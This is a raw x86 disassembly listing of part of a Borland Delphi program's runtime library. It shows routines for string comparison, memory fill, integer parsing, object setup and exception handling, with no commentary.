  402a66:	3a 4a 01             	cmp    0x1(%edx),%cl
  402a69:	75 25                	jne    0x402a90
  402a6b:	4e                   	dec    %esi
  402a6c:	74 08                	je     0x402a76
  402a6e:	8a 48 02             	mov    0x2(%eax),%cl
  402a71:	3a 4a 02             	cmp    0x2(%edx),%cl
  402a74:	75 1a                	jne    0x402a90
  402a76:	31 c0                	xor    %eax,%eax
  402a78:	5e                   	pop    %esi
  402a79:	5b                   	pop    %ebx
  402a7a:	c3                   	ret
  402a7b:	5e                   	pop    %esi
  402a7c:	38 d9                	cmp    %bl,%cl
  402a7e:	75 10                	jne    0x402a90
  402a80:	38 fd                	cmp    %bh,%ch
  402a82:	75 0c                	jne    0x402a90
  402a84:	c1 e9 10             	shr    $0x10,%ecx
  402a87:	c1 eb 10             	shr    $0x10,%ebx
  402a8a:	38 d9                	cmp    %bl,%cl
  402a8c:	75 02                	jne    0x402a90
  402a8e:	38 fd                	cmp    %bh,%ch
  402a90:	5e                   	pop    %esi
  402a91:	5b                   	pop    %ebx
  402a92:	c3                   	ret
  402a93:	90                   	nop
  402a94:	57                   	push   %edi
  402a95:	89 c7                	mov    %eax,%edi
  402a97:	88 cd                	mov    %cl,%ch
  402a99:	89 c8                	mov    %ecx,%eax
  402a9b:	c1 e0 10             	shl    $0x10,%eax
  402a9e:	66 89 c8             	mov    %cx,%ax
  402aa1:	89 d1                	mov    %edx,%ecx
  402aa3:	c1 f9 02             	sar    $0x2,%ecx
  402aa6:	78 09                	js     0x402ab1
  402aa8:	f3 ab                	rep stos %eax,%es:(%edi)
  402aaa:	89 d1                	mov    %edx,%ecx
  402aac:	83 e1 03             	and    $0x3,%ecx
  402aaf:	f3 aa                	rep stos %al,%es:(%edi)
  402ab1:	5f                   	pop    %edi
  402ab2:	c3                   	ret
  402ab3:	90                   	nop
  402ab4:	53                   	push   %ebx
  402ab5:	56                   	push   %esi
  402ab6:	57                   	push   %edi
  402ab7:	89 c6                	mov    %eax,%esi
  402ab9:	50                   	push   %eax
  402aba:	85 c0                	test   %eax,%eax
  402abc:	74 6c                	je     0x402b2a
  402abe:	31 c0                	xor    %eax,%eax
  402ac0:	31 db                	xor    %ebx,%ebx
  402ac2:	bf cc cc cc 0c       	mov    $0xccccccc,%edi
  402ac7:	8a 1e                	mov    (%esi),%bl
  402ac9:	46                   	inc    %esi
  402aca:	80 fb 20             	cmp    $0x20,%bl
  402acd:	74 f8                	je     0x402ac7
  402acf:	b5 00                	mov    $0x0,%ch
  402ad1:	80 fb 2d             	cmp    $0x2d,%bl
  402ad4:	74 62                	je     0x402b38
  402ad6:	80 fb 2b             	cmp    $0x2b,%bl
  402ad9:	74 5f                	je     0x402b3a
  402adb:	80 fb 24             	cmp    $0x24,%bl
  402ade:	74 5f                	je     0x402b3f
  402ae0:	80 fb 78             	cmp    $0x78,%bl
  402ae3:	74 5a                	je     0x402b3f
  402ae5:	80 fb 58             	cmp    $0x58,%bl
  402ae8:	74 55                	je     0x402b3f
  402aea:	80 fb 30             	cmp    $0x30,%bl
  402aed:	75 13                	jne    0x402b02
  402aef:	8a 1e                	mov    (%esi),%bl
  402af1:	46                   	inc    %esi
  402af2:	80 fb 78             	cmp    $0x78,%bl
  402af5:	74 48                	je     0x402b3f
  402af7:	80 fb 58             	cmp    $0x58,%bl
  402afa:	74 43                	je     0x402b3f
  402afc:	84 db                	test   %bl,%bl
  402afe:	74 20                	je     0x402b20
  402b00:	eb 04                	jmp    0x402b06
  402b02:	84 db                	test   %bl,%bl
  402b04:	74 2d                	je     0x402b33
  402b06:	80 eb 30             	sub    $0x30,%bl
  402b09:	80 fb 09             	cmp    $0x9,%bl
  402b0c:	77 25                	ja     0x402b33
  402b0e:	39 f8                	cmp    %edi,%eax
  402b10:	77 21                	ja     0x402b33
  402b12:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402b15:	01 c0                	add    %eax,%eax
  402b17:	01 d8                	add    %ebx,%eax
  402b19:	8a 1e                	mov    (%esi),%bl
  402b1b:	46                   	inc    %esi
  402b1c:	84 db                	test   %bl,%bl
  402b1e:	75 e6                	jne    0x402b06
  402b20:	fe cd                	dec    %ch
  402b22:	74 09                	je     0x402b2d
  402b24:	85 c0                	test   %eax,%eax
  402b26:	7d 54                	jge    0x402b7c
  402b28:	eb 09                	jmp    0x402b33
  402b2a:	46                   	inc    %esi
  402b2b:	eb 06                	jmp    0x402b33
  402b2d:	f7 d8                	neg    %eax
  402b2f:	7e 4b                	jle    0x402b7c
  402b31:	78 49                	js     0x402b7c
  402b33:	5b                   	pop    %ebx
  402b34:	29 de                	sub    %ebx,%esi
  402b36:	eb 47                	jmp    0x402b7f
  402b38:	fe c5                	inc    %ch
  402b3a:	8a 1e                	mov    (%esi),%bl
  402b3c:	46                   	inc    %esi
  402b3d:	eb 9c                	jmp    0x402adb
  402b3f:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  402b44:	8a 1e                	mov    (%esi),%bl
  402b46:	46                   	inc    %esi
  402b47:	84 db                	test   %bl,%bl
  402b49:	74 df                	je     0x402b2a
  402b4b:	80 fb 61             	cmp    $0x61,%bl
  402b4e:	72 03                	jb     0x402b53
  402b50:	80 eb 20             	sub    $0x20,%bl
  402b53:	80 eb 30             	sub    $0x30,%bl
  402b56:	80 fb 09             	cmp    $0x9,%bl
  402b59:	76 0b                	jbe    0x402b66
  402b5b:	80 eb 11             	sub    $0x11,%bl
  402b5e:	80 fb 05             	cmp    $0x5,%bl
  402b61:	77 d0                	ja     0x402b33
  402b63:	80 c3 0a             	add    $0xa,%bl
  402b66:	39 f8                	cmp    %edi,%eax
  402b68:	77 c9                	ja     0x402b33
  402b6a:	c1 e0 04             	shl    $0x4,%eax
  402b6d:	01 d8                	add    %ebx,%eax
  402b6f:	8a 1e                	mov    (%esi),%bl
  402b71:	46                   	inc    %esi
  402b72:	84 db                	test   %bl,%bl
  402b74:	75 d5                	jne    0x402b4b
  402b76:	fe cd                	dec    %ch
  402b78:	75 02                	jne    0x402b7c
  402b7a:	f7 d8                	neg    %eax
  402b7c:	59                   	pop    %ecx
  402b7d:	31 f6                	xor    %esi,%esi
  402b7f:	89 32                	mov    %esi,(%edx)
  402b81:	5f                   	pop    %edi
  402b82:	5e                   	pop    %esi
  402b83:	5b                   	pop    %ebx
  402b84:	c3                   	ret
  402b85:	8d 40 00             	lea    0x0(%eax),%eax
  402b88:	53                   	push   %ebx
  402b89:	57                   	push   %edi
  402b8a:	89 c7                	mov    %eax,%edi
  402b8c:	31 db                	xor    %ebx,%ebx
  402b8e:	88 cb                	mov    %cl,%bl
  402b90:	89 d9                	mov    %ebx,%ecx
  402b92:	31 c0                	xor    %eax,%eax
  402b94:	f3 aa                	rep stos %al,%es:(%edi)
  402b96:	29 df                	sub    %ebx,%edi
  402b98:	40                   	inc    %eax
  402b99:	88 d1                	mov    %dl,%cl
  402b9b:	d2 c0                	rol    %cl,%al
  402b9d:	c1 e9 03             	shr    $0x3,%ecx
  402ba0:	39 d9                	cmp    %ebx,%ecx
  402ba2:	73 03                	jae    0x402ba7
  402ba4:	08 04 39             	or     %al,(%ecx,%edi,1)
  402ba7:	5f                   	pop    %edi
  402ba8:	5b                   	pop    %ebx
  402ba9:	c3                   	ret
  402baa:	8b c0                	mov    %eax,%eax
  402bac:	83 fa 01             	cmp    $0x1,%edx
  402baf:	73 01                	jae    0x402bb2
  402bb1:	c3                   	ret
  402bb2:	51                   	push   %ecx
  402bb3:	85 c0                	test   %eax,%eax
  402bb5:	75 43                	jne    0x402bfa
  402bb7:	8b 42 f8             	mov    -0x8(%edx),%eax
  402bba:	85 c0                	test   %eax,%eax
  402bbc:	74 35                	je     0x402bf3
  402bbe:	52                   	push   %edx
  402bbf:	e8 6c fc ff ff       	call   0x402830
  402bc4:	5a                   	pop    %edx
  402bc5:	85 c0                	test   %eax,%eax
  402bc7:	74 26                	je     0x402bef
  402bc9:	57                   	push   %edi
  402bca:	8b 4a f8             	mov    -0x8(%edx),%ecx
  402bcd:	89 c7                	mov    %eax,%edi
  402bcf:	50                   	push   %eax
  402bd0:	31 c0                	xor    %eax,%eax
  402bd2:	c1 e9 02             	shr    $0x2,%ecx
  402bd5:	f3 ab                	rep stos %eax,%es:(%edi)
  402bd7:	8b 4a f8             	mov    -0x8(%edx),%ecx
  402bda:	83 e1 03             	and    $0x3,%ecx
  402bdd:	f3 aa                	rep stos %al,%es:(%edi)
  402bdf:	58                   	pop    %eax
  402be0:	5f                   	pop    %edi
  402be1:	8b 4a fc             	mov    -0x4(%edx),%ecx
  402be4:	85 c9                	test   %ecx,%ecx
  402be6:	7c 03                	jl     0x402beb
  402be8:	89 14 01             	mov    %edx,(%ecx,%eax,1)
  402beb:	85 c0                	test   %eax,%eax
  402bed:	59                   	pop    %ecx
  402bee:	c3                   	ret
  402bef:	31 d2                	xor    %edx,%edx
  402bf1:	59                   	pop    %ecx
  402bf2:	c3                   	ret
  402bf3:	31 d2                	xor    %edx,%edx
  402bf5:	83 f8 01             	cmp    $0x1,%eax
  402bf8:	59                   	pop    %ecx
  402bf9:	c3                   	ret
  402bfa:	8b 4a fc             	mov    -0x4(%edx),%ecx
  402bfd:	85 c9                	test   %ecx,%ecx
  402bff:	7c 03                	jl     0x402c04
  402c01:	89 14 01             	mov    %edx,(%ecx,%eax,1)
  402c04:	31 d2                	xor    %edx,%edx
  402c06:	85 c0                	test   %eax,%eax
  402c08:	59                   	pop    %ecx
  402c09:	c3                   	ret
  402c0a:	8b c0                	mov    %eax,%eax
  402c0c:	ff 25 28 b2 42 00    	jmp    *0x42b228
  402c12:	8b c0                	mov    %eax,%eax
  402c14:	53                   	push   %ebx
  402c15:	33 db                	xor    %ebx,%ebx
  402c17:	6a 00                	push   $0x0
  402c19:	e8 ee ff ff ff       	call   0x402c0c
  402c1e:	83 f8 07             	cmp    $0x7,%eax
  402c21:	75 1c                	jne    0x402c3f
  402c23:	6a 01                	push   $0x1
  402c25:	e8 e2 ff ff ff       	call   0x402c0c
  402c2a:	25 00 ff 00 00       	and    $0xff00,%eax
  402c2f:	3d 00 0d 00 00       	cmp    $0xd00,%eax
  402c34:	74 07                	je     0x402c3d
  402c36:	3d 00 04 00 00       	cmp    $0x400,%eax
  402c3b:	75 02                	jne    0x402c3f
  402c3d:	b3 01                	mov    $0x1,%bl
  402c3f:	8b c3                	mov    %ebx,%eax
  402c41:	5b                   	pop    %ebx
  402c42:	c3                   	ret
  402c43:	90                   	nop
  402c44:	55                   	push   %ebp
  402c45:	8b ec                	mov    %esp,%ebp
  402c47:	83 c4 f4             	add    $0xfffffff4,%esp
  402c4a:	0f b7 05 14 60 42 00 	movzwl 0x426014,%eax
  402c51:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402c54:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402c57:	50                   	push   %eax
  402c58:	6a 01                	push   $0x1
  402c5a:	6a 00                	push   $0x0
  402c5c:	68 dc 2c 40 00       	push   $0x402cdc
  402c61:	68 02 00 00 80       	push   $0x80000002
  402c66:	e8 71 e4 ff ff       	call   0x4010dc
  402c6b:	85 c0                	test   %eax,%eax
  402c6d:	75 4d                	jne    0x402cbc
  402c6f:	33 c0                	xor    %eax,%eax
  402c71:	55                   	push   %ebp
  402c72:	68 b5 2c 40 00       	push   $0x402cb5
  402c77:	64 ff 30             	push   %fs:(%eax)
  402c7a:	64 89 20             	mov    %esp,%fs:(%eax)
  402c7d:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  402c84:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402c87:	50                   	push   %eax
  402c88:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402c8b:	50                   	push   %eax
  402c8c:	6a 00                	push   $0x0
  402c8e:	6a 00                	push   $0x0
  402c90:	68 f8 2c 40 00       	push   $0x402cf8
  402c95:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c98:	50                   	push   %eax
  402c99:	e8 46 e4 ff ff       	call   0x4010e4
  402c9e:	33 c0                	xor    %eax,%eax
  402ca0:	5a                   	pop    %edx
  402ca1:	59                   	pop    %ecx
  402ca2:	59                   	pop    %ecx
  402ca3:	64 89 10             	mov    %edx,%fs:(%eax)
  402ca6:	68 bc 2c 40 00       	push   $0x402cbc
  402cab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402cae:	50                   	push   %eax
  402caf:	e8 20 e4 ff ff       	call   0x4010d4
  402cb4:	c3                   	ret
  402cb5:	e9 4e 04 00 00       	jmp    0x403108
  402cba:	eb ef                	jmp    0x402cab
  402cbc:	66 a1 14 60 42 00    	mov    0x426014,%ax
  402cc2:	66 25 c0 ff          	and    $0xffc0,%ax
  402cc6:	66 8b 55 f8          	mov    -0x8(%ebp),%dx
  402cca:	66 83 e2 3f          	and    $0x3f,%dx
  402cce:	66 0b c2             	or     %dx,%ax
  402cd1:	66 a3 14 60 42 00    	mov    %ax,0x426014
  402cd7:	8b e5                	mov    %ebp,%esp
  402cd9:	5d                   	pop    %ebp
  402cda:	c3                   	ret
  402cdb:	00 53 4f             	add    %dl,0x4f(%ebx)
  402cde:	46                   	inc    %esi
  402cdf:	54                   	push   %esp
  402ce0:	57                   	push   %edi
  402ce1:	41                   	inc    %ecx
  402ce2:	52                   	push   %edx
  402ce3:	45                   	inc    %ebp
  402ce4:	5c                   	pop    %esp
  402ce5:	42                   	inc    %edx
  402ce6:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce7:	72 6c                	jb     0x402d55
  402ce9:	61                   	popa
  402cea:	6e                   	outsb  %ds:(%esi),(%dx)
  402ceb:	64 5c                	fs pop %esp
  402ced:	44                   	inc    %esp
  402cee:	65 6c                	gs insb (%dx),%es:(%edi)
  402cf0:	70 68                	jo     0x402d5a
  402cf2:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
  402cf9:	50 
  402cfa:	55                   	push   %ebp
  402cfb:	4d                   	dec    %ebp
  402cfc:	61                   	popa
  402cfd:	73 6b                	jae    0x402d6a
  402cff:	56                   	push   %esi
  402d00:	61                   	popa
  402d01:	6c                   	insb   (%dx),%es:(%edi)
  402d02:	75 65                	jne    0x402d69
  402d04:	00 00                	add    %al,(%eax)
  402d06:	00 00                	add    %al,(%eax)
  402d08:	db e3                	fninit
  402d0a:	9b d9 2d 14 60 42 00 	fldcw  0x426014
  402d11:	c3                   	ret
  402d12:	8b c0                	mov    %eax,%eax
  402d14:	b0 04                	mov    $0x4,%al
  402d16:	e9 0d fc ff ff       	jmp    0x402928
  402d1b:	c3                   	ret
  402d1c:	53                   	push   %ebx
  402d1d:	8b d8                	mov    %eax,%ebx
  402d1f:	8b c3                	mov    %ebx,%eax
  402d21:	e8 26 00 00 00       	call   0x402d4c
  402d26:	e8 05 fb ff ff       	call   0x402830
  402d2b:	8b d0                	mov    %eax,%edx
  402d2d:	8b c3                	mov    %ebx,%eax
  402d2f:	e8 5c 00 00 00       	call   0x402d90
  402d34:	5b                   	pop    %ebx
  402d35:	c3                   	ret
  402d36:	8b c0                	mov    %eax,%eax
  402d38:	53                   	push   %ebx
  402d39:	8b d8                	mov    %eax,%ebx
  402d3b:	8b c3                	mov    %ebx,%eax
  402d3d:	e8 a6 00 00 00       	call   0x402de8
  402d42:	8b c3                	mov    %ebx,%eax
  402d44:	e8 17 fb ff ff       	call   0x402860
  402d49:	5b                   	pop    %ebx
  402d4a:	c3                   	ret
  402d4b:	90                   	nop
  402d4c:	83 c0 d8             	add    $0xffffffd8,%eax
  402d4f:	8b 00                	mov    (%eax),%eax
  402d51:	c3                   	ret
  402d52:	8b c0                	mov    %eax,%eax
  402d54:	84 d2                	test   %dl,%dl
  402d56:	74 08                	je     0x402d60
  402d58:	83 c4 f0             	add    $0xfffffff0,%esp
  402d5b:	e8 14 01 00 00       	call   0x402e74
  402d60:	84 d2                	test   %dl,%dl
  402d62:	74 0f                	je     0x402d73
  402d64:	e8 63 01 00 00       	call   0x402ecc
  402d69:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402d70:	83 c4 0c             	add    $0xc,%esp
  402d73:	c3                   	ret
  402d74:	e8 63 01 00 00       	call   0x402edc
  402d79:	84 d2                	test   %dl,%dl
  402d7b:	7e 05                	jle    0x402d82
  402d7d:	e8 42 01 00 00       	call   0x402ec4
  402d82:	c3                   	ret
  402d83:	90                   	nop
  402d84:	85 c0                	test   %eax,%eax
  402d86:	74 07                	je     0x402d8f
  402d88:	b2 01                	mov    $0x1,%dl
  402d8a:	8b 08                	mov    (%eax),%ecx
  402d8c:	ff 51 fc             	call   *-0x4(%ecx)
  402d8f:	c3                   	ret
  402d90:	53                   	push   %ebx
  402d91:	56                   	push   %esi
  402d92:	57                   	push   %edi
  402d93:	89 c3                	mov    %eax,%ebx
  402d95:	89 d7                	mov    %edx,%edi
  402d97:	ab                   	stos   %eax,%es:(%edi)
  402d98:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  402d9b:	31 c0                	xor    %eax,%eax
  402d9d:	51                   	push   %ecx
  402d9e:	c1 e9 02             	shr    $0x2,%ecx
  402da1:	49                   	dec    %ecx
  402da2:	f3 ab                	rep stos %eax,%es:(%edi)
  402da4:	59                   	pop    %ecx
  402da5:	83 e1 03             	and    $0x3,%ecx
  402da8:	f3 aa                	rep stos %al,%es:(%edi)
  402daa:	89 d0                	mov    %edx,%eax
  402dac:	89 e2                	mov    %esp,%edx
  402dae:	8b 4b b8             	mov    -0x48(%ebx),%ecx
  402db1:	85 c9                	test   %ecx,%ecx
  402db3:	74 01                	je     0x402db6
  402db5:	51                   	push   %ecx
  402db6:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  402db9:	85 db                	test   %ebx,%ebx
  402dbb:	74 04                	je     0x402dc1
  402dbd:	8b 1b                	mov    (%ebx),%ebx
  402dbf:	eb ed                	jmp    0x402dae
  402dc1:	39 d4                	cmp    %edx,%esp
  402dc3:	74 1d                	je     0x402de2
  402dc5:	5b                   	pop    %ebx
  402dc6:	8b 0b                	mov    (%ebx),%ecx
  402dc8:	83 c3 04             	add    $0x4,%ebx
  402dcb:	8b 73 10             	mov    0x10(%ebx),%esi
  402dce:	85 f6                	test   %esi,%esi
  402dd0:	74 06                	je     0x402dd8
  402dd2:	8b 7b 14             	mov    0x14(%ebx),%edi
  402dd5:	89 34 07             	mov    %esi,(%edi,%eax,1)
  402dd8:	83 c3 1c             	add    $0x1c,%ebx
  402ddb:	49                   	dec    %ecx
  402ddc:	75 ed                	jne    0x402dcb
  402dde:	39 d4                	cmp    %edx,%esp
  402de0:	75 e3                	jne    0x402dc5
  402de2:	5f                   	pop    %edi
  402de3:	5e                   	pop    %esi
  402de4:	5b                   	pop    %ebx
  402de5:	c3                   	ret
  402de6:	8b c0                	mov    %eax,%eax
  402de8:	53                   	push   %ebx
  402de9:	56                   	push   %esi
  402dea:	89 c3                	mov    %eax,%ebx
  402dec:	89 c6                	mov    %eax,%esi
  402dee:	8b 36                	mov    (%esi),%esi
  402df0:	8b 56 c0             	mov    -0x40(%esi),%edx
  402df3:	8b 76 dc             	mov    -0x24(%esi),%esi
  402df6:	85 d2                	test   %edx,%edx
  402df8:	74 07                	je     0x402e01
  402dfa:	e8 4d 0f 00 00       	call   0x403d4c
  402dff:	89 d8                	mov    %ebx,%eax
  402e01:	85 f6                	test   %esi,%esi
  402e03:	75 e9                	jne    0x402dee
  402e05:	5e                   	pop    %esi
  402e06:	5b                   	pop    %ebx
  402e07:	c3                   	ret
  402e08:	57                   	push   %edi
  402e09:	96                   	xchg   %eax,%esi
  402e0a:	eb 02                	jmp    0x402e0e
  402e0c:	8b 36                	mov    (%esi),%esi
  402e0e:	8b 7e d0             	mov    -0x30(%esi),%edi
  402e11:	85 ff                	test   %edi,%edi
  402e13:	74 0d                	je     0x402e22
  402e15:	0f b7 0f             	movzwl (%edi),%ecx
  402e18:	51                   	push   %ecx
  402e19:	83 c7 02             	add    $0x2,%edi
  402e1c:	f2 66 af             	repnz scas %es:(%edi),%ax
  402e1f:	74 0a                	je     0x402e2b
  402e21:	59                   	pop    %ecx
  402e22:	8b 76 dc             	mov    -0x24(%esi),%esi
  402e25:	85 f6                	test   %esi,%esi
  402e27:	75 e3                	jne    0x402e0c
  402e29:	5f                   	pop    %edi
  402e2a:	c3                   	ret
  402e2b:	58                   	pop    %eax
  402e2c:	01 c0                	add    %eax,%eax
  402e2e:	29 c8                	sub    %ecx,%eax
  402e30:	8b 74 47 fc          	mov    -0x4(%edi,%eax,2),%esi
  402e34:	5f                   	pop    %edi
  402e35:	c3                   	ret
  402e36:	8b c0                	mov    %eax,%eax
  402e38:	b8 ff ff 00 80       	mov    $0x8000ffff,%eax
  402e3d:	c3                   	ret
  402e3e:	8b c0                	mov    %eax,%eax
  402e40:	c3                   	ret
  402e41:	8d 40 00             	lea    0x0(%eax),%eax
  402e44:	c3                   	ret
  402e45:	8d 40 00             	lea    0x0(%eax),%eax
  402e48:	c3                   	ret
  402e49:	8d 40 00             	lea    0x0(%eax),%eax
  402e4c:	56                   	push   %esi
  402e4d:	66 8b 32             	mov    (%edx),%si
  402e50:	66 09 f6             	or     %si,%si
  402e53:	74 17                	je     0x402e6c
  402e55:	66 81 fe 00 c0       	cmp    $0xc000,%si
  402e5a:	73 10                	jae    0x402e6c
  402e5c:	50                   	push   %eax
  402e5d:	8b 00                	mov    (%eax),%eax
  402e5f:	e8 a4 ff ff ff       	call   0x402e08
  402e64:	58                   	pop    %eax
  402e65:	74 05                	je     0x402e6c
  402e67:	89 f1                	mov    %esi,%ecx
  402e69:	5e                   	pop    %esi
  402e6a:	ff e1                	jmp    *%ecx
  402e6c:	5e                   	pop    %esi
  402e6d:	8b 08                	mov    (%eax),%ecx
  402e6f:	ff 61 f0             	jmp    *-0x10(%ecx)
  402e72:	c3                   	ret
  402e73:	90                   	nop
  402e74:	52                   	push   %edx
  402e75:	51                   	push   %ecx
  402e76:	53                   	push   %ebx
  402e77:	84 d2                	test   %dl,%dl
  402e79:	7c 03                	jl     0x402e7e
  402e7b:	ff 50 f4             	call   *-0xc(%eax)
  402e7e:	31 d2                	xor    %edx,%edx
  402e80:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402e84:	64 8b 1a             	mov    %fs:(%edx),%ebx
  402e87:	89 19                	mov    %ebx,(%ecx)
  402e89:	89 69 08             	mov    %ebp,0x8(%ecx)
  402e8c:	c7 41 04 9d 2e 40 00 	movl   $0x402e9d,0x4(%ecx)
  402e93:	89 41 0c             	mov    %eax,0xc(%ecx)
  402e96:	64 89 0a             	mov    %ecx,%fs:(%edx)
  402e99:	5b                   	pop    %ebx
  402e9a:	59                   	pop    %ecx
  402e9b:	5a                   	pop    %edx
  402e9c:	c3                   	ret
  402e9d:	e9 3a 01 00 00       	jmp    0x402fdc
  402ea2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402ea6:	8b 40 0c             	mov    0xc(%eax),%eax
  402ea9:	85 c0                	test   %eax,%eax
  402eab:	74 0e                	je     0x402ebb
  402ead:	8b 08                	mov    (%eax),%ecx
  402eaf:	b2 81                	mov    $0x81,%dl
  402eb1:	50                   	push   %eax
  402eb2:	ff 51 fc             	call   *-0x4(%ecx)
  402eb5:	58                   	pop    %eax
  402eb6:	e8 09 00 00 00       	call   0x402ec4
  402ebb:	e8 80 02 00 00       	call   0x403140
  402ec0:	c3                   	ret
  402ec1:	8d 40 00             	lea    0x0(%eax),%eax
  402ec4:	8b 10                	mov    (%eax),%edx
  402ec6:	ff 52 f8             	call   *-0x8(%edx)
  402ec9:	c3                   	ret
  402eca:	8b c0                	mov    %eax,%eax
  402ecc:	53                   	push   %ebx
  402ecd:	8b d8                	mov    %eax,%ebx
  402ecf:	8b c3                	mov    %ebx,%eax
  402ed1:	8b 10                	mov    (%eax),%edx
  402ed3:	ff 52 e4             	call   *-0x1c(%edx)
  402ed6:	8b c3                	mov    %ebx,%eax
  402ed8:	5b                   	pop    %ebx
  402ed9:	c3                   	ret
  402eda:	8b c0                	mov    %eax,%eax
  402edc:	84 d2                	test   %dl,%dl
  402ede:	7f 01                	jg     0x402ee1
  402ee0:	c3                   	ret
  402ee1:	50                   	push   %eax
  402ee2:	52                   	push   %edx
  402ee3:	8b 10                	mov    (%eax),%edx
  402ee5:	ff 52 e8             	call   *-0x18(%edx)
  402ee8:	5a                   	pop    %edx
  402ee9:	58                   	pop    %eax
  402eea:	c3                   	ret
  402eeb:	90                   	nop
  402eec:	80 3d 18 60 42 00 01 	cmpb   $0x1,0x426018
  402ef3:	76 11                	jbe    0x402f06
  402ef5:	6a 00                	push   $0x0
  402ef7:	6a 00                	push   $0x0
  402ef9:	6a 00                	push   $0x0
  402efb:	68 df fa ed 0e       	push   $0xeedfadf
  402f00:	ff 15 10 90 42 00    	call   *0x429010
  402f06:	c3                   	ret
  402f07:	90                   	nop
  402f08:	80 3d 18 60 42 00 00 	cmpb   $0x0,0x426018
  402f0f:	74 17                	je     0x402f28
  402f11:	50                   	push   %eax
  402f12:	50                   	push   %eax
  402f13:	52                   	push   %edx
  402f14:	54                   	push   %esp
  402f15:	6a 02                	push   $0x2
  402f17:	6a 00                	push   $0x0
  402f19:	68 e4 fa ed 0e       	push   $0xeedfae4
  402f1e:	ff 15 10 90 42 00    	call   *0x429010
  402f24:	83 c4 08             	add    $0x8,%esp
  402f27:	58                   	pop    %eax
  402f28:	c3                   	ret
  402f29:	8d 40 00             	lea    0x0(%eax),%eax
  402f2c:	54                   	push   %esp
  402f2d:	6a 01                	push   $0x1
  402f2f:	6a 00                	push   $0x0
  402f31:	68 e0 fa ed 0e       	push   $0xeedfae0
  402f36:	ff 15 10 90 42 00    	call   *0x429010
  402f3c:	83 c4 04             	add    $0x4,%esp
  402f3f:	58                   	pop    %eax
  402f40:	c3                   	ret
  402f41:	8d 40 00             	lea    0x0(%eax),%eax
  402f44:	80 3d 18 60 42 00 01 	cmpb   $0x1,0x426018
  402f4b:	76 07                	jbe    0x402f54
  402f4d:	50                   	push   %eax
  402f4e:	53                   	push   %ebx
  402f4f:	e9 d8 ff ff ff       	jmp    0x402f2c
  402f54:	c3                   	ret
  402f55:	8d 40 00             	lea    0x0(%eax),%eax
  402f58:	85 c9                	test   %ecx,%ecx
  402f5a:	74 19                	je     0x402f75
  402f5c:	8b 41 01             	mov    0x1(%ecx),%eax
  402f5f:	80 39 e9             	cmpb   $0xe9,(%ecx)
  402f62:	74 0c                	je     0x402f70
  402f64:	80 39 eb             	cmpb   $0xeb,(%ecx)
  402f67:	75 0c                	jne    0x402f75
  402f69:	0f be c0             	movsbl %al,%eax
  402f6c:	41                   	inc    %ecx
  402f6d:	41                   	inc    %ecx
  402f6e:	eb 03                	jmp    0x402f73
  402f70:	83 c1 05             	add    $0x5,%ecx
  402f73:	01 c1                	add    %eax,%ecx
  402f75:	c3                   	ret
  402f76:	8b c0                	mov    %eax,%eax
  402f78:	80 3d 18 60 42 00 01 	cmpb   $0x1,0x426018
  402f7f:	76 1d                	jbe    0x402f9e
  402f81:	50                   	push   %eax
  402f82:	52                   	push   %edx
  402f83:	51                   	push   %ecx
  402f84:	e8 cf ff ff ff       	call   0x402f58
  402f89:	51                   	push   %ecx
  402f8a:	54                   	push   %esp
  402f8b:	6a 01                	push   $0x1
  402f8d:	6a 00                	push   $0x0
  402f8f:	68 e1 fa ed 0e       	push   $0xeedfae1
  402f94:	ff 15 10 90 42 00    	call   *0x429010
  402f9a:	59                   	pop    %ecx
  402f9b:	59                   	pop    %ecx
  402f9c:	5a                   	pop    %edx
  402f9d:	58                   	pop    %eax
  402f9e:	c3                   	ret
  402f9f:	90                   	nop
  402fa0:	80 3d 18 60 42 00 01 	cmpb   $0x1,0x426018
  402fa7:	76 12                	jbe    0x402fbb
  402fa9:	52                   	push   %edx
  402faa:	54                   	push   %esp
  402fab:	6a 01                	push   $0x1
  402fad:	6a 00                	push   $0x0
  402faf:	68 e2 fa ed 0e       	push   $0xeedfae2
  402fb4:	ff 15 10 90 42 00    	call   *0x429010
  402fba:	5a                   	pop    %edx
  402fbb:	c3                   	ret
  402fbc:	50                   	push   %eax
  402fbd:	52                   	push   %edx
  402fbe:	80 3d 18 60 42 00 01 	cmpb   $0x1,0x426018
  402fc5:	76 10                	jbe    0x402fd7
  402fc7:	54                   	push   %esp
  402fc8:	6a 02                	push   $0x2
  402fca:	6a 00                	push   $0x0
  402fcc:	68 e3 fa ed 0e       	push   $0xeedfae3
  402fd1:	ff 15 10 90 42 00    	call   *0x429010
  402fd7:	5a                   	pop    %edx
  402fd8:	58                   	pop    %eax
  402fd9:	c3                   	ret
  402fda:	8b c0                	mov    %eax,%eax
  402fdc:	8b 44 24 04          	mov    0x4(%esp),%eax
  402fe0:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402fe7:	0f 85 13 01 00 00    	jne    0x403100
  402fed:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  402ff3:	8b 50 18             	mov    0x18(%eax),%edx
  402ff6:	8b 48 14             	mov    0x14(%eax),%ecx
  402ff9:	74 6e                	je     0x403069
  402ffb:	fc                   	cld
  402ffc:	e8 07 fd ff ff       	call   0x402d08
  403001:	8b 15 0c 90 42 00    	mov    0x42900c,%edx
  403007:	85 d2                	test   %edx,%edx
  403009:	0f 84 f1 00 00 00    	je     0x403100
  40300f:	ff d2                	call   *%edx
  403011:	85 c0                	test   %eax,%eax
  403013:	0f 84 e7 00 00 00    	je     0x403100
  403019:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40301d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403021:	81 39 ce fa ef 0e    	cmpl   $0xeefface,(%ecx)
  403027:	74 37                	je     0x403060
